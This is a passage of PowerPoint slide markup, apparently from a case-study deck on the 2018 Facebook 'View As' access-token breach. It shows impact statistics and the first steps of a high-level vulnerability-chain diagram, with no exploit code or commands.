            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="748189" y="1179552"/>
            <a:ext cx="592217" cy="88702"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>MAJOR BREACH</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1443871" y="1143714"/>
            <a:ext cx="784503" cy="160377"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 19710"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="007EBD"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1507927" y="1179552"/>
            <a:ext cx="656392" cy="88702"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="007EBD"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>50M+ ACCOUNTS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="578882" y="1401247"/>
            <a:ext cx="4453652" cy="310396"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>50M</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2127290" y="1792010"/>
            <a:ext cx="1356717" cy="154305"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Accounts Compromised</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="578882" y="1972985"/>
            <a:ext cx="4453652" cy="110847"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Initial impact of the authentication token theft vulnerability</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5088255" y="1401247"/>
            <a:ext cx="4453771" cy="310396"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>40M</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6482239" y="1792010"/>
            <a:ext cx="1665803" cy="154305"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Additional Accounts Affected</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5088255" y="1972985"/>
            <a:ext cx="4453771" cy="110847"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Potentially compromised users identified during investigation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9597747" y="1401247"/>
            <a:ext cx="4453652" cy="310396"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$5B</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11207234" y="1792010"/>
            <a:ext cx="1234678" cy="154305"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>FTC Fine</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9597747" y="1972985"/>
            <a:ext cx="4453652" cy="110847"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Regulatory penalty imposed for privacy violations and security failures</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="578882" y="2133957"/>
            <a:ext cx="13472636" cy="110847"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Company:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Facebook | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Date:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> September 2018 | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Type:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Authentication token theft via authorization bypass | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Discovery:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Facebook's internal security team detected unusual access patterns</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="578882" y="2311598"/>
            <a:ext cx="1952387" cy="185142"/>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Vulnerability Chain Analysis</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7307580" y="2563535"/>
            <a:ext cx="15240" cy="2561511"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 259269"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B2D4E5"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6942475" y="2661642"/>
            <a:ext cx="282178" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 259269"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B2D4E5"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7209413" y="2563535"/>
            <a:ext cx="211574" cy="211574"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 18676"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7241084" y="2576691"/>
            <a:ext cx="148114" cy="185142"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5610225" y="2595801"/>
            <a:ext cx="1234678" cy="154305"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="r">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>"View As" Feature</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="578882" y="2776776"/>
            <a:ext cx="6266021" cy="110847"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="r">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Privacy feature allowing users to see their profile as others see it. URL: facebook.com/profile.php?viewas=USER_ID</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7405747" y="3127057"/>
            <a:ext cx="282178" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 259269"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B2D4E5"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7209413" y="3028950"/>
            <a:ext cx="211574" cy="211574"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 18676"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7241084" y="3042106"/>
            <a:ext cx="148114" cy="185142"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7785497" y="3061216"/>
            <a:ext cx="1572101" cy="154305"/>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Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Video Uploader Component</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7785497" y="3242191"/>
            <a:ext cx="6266021" cy="110847"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Media upload interface integrated into profile view functionality</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Shape 27"/>
